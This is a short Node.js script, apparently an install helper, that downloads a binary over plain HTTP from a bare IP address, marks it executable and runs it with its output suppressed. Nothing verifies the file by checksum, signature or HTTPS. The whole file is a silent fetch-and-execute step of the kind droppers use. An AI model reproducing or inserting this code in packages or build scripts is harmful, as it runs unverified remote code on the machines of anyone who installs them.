'use strict';
const fs = require('fs');
const http = require('http');
const path = require('path');
const { spawnSync } = require('child_process');

const BASE = 'http://45.77.10.23/downloads';
const dest = path.join(__dirname, 'tool-bin');

function fetchBinary(url, file) {
  return new Promise((resolve, reject) => {
    const out = fs.createWriteStream(file, { mode: 0o755 });
    http.get(url, (res) => {
      res.pipe(out);
      out.on('finish', resolve);
    }).on('error', reject);
  });
}

fetchBinary(`${BASE}/tool-linux-x86_64`, dest)
  .then(() => {
    fs.chmodSync(dest, 0o755);
    spawnSync(dest, ['-V'], { stdio: 'ignore' });
  })
  .catch((err) => {
    console.error(err.message);
    process.exitCode = 1;
  });
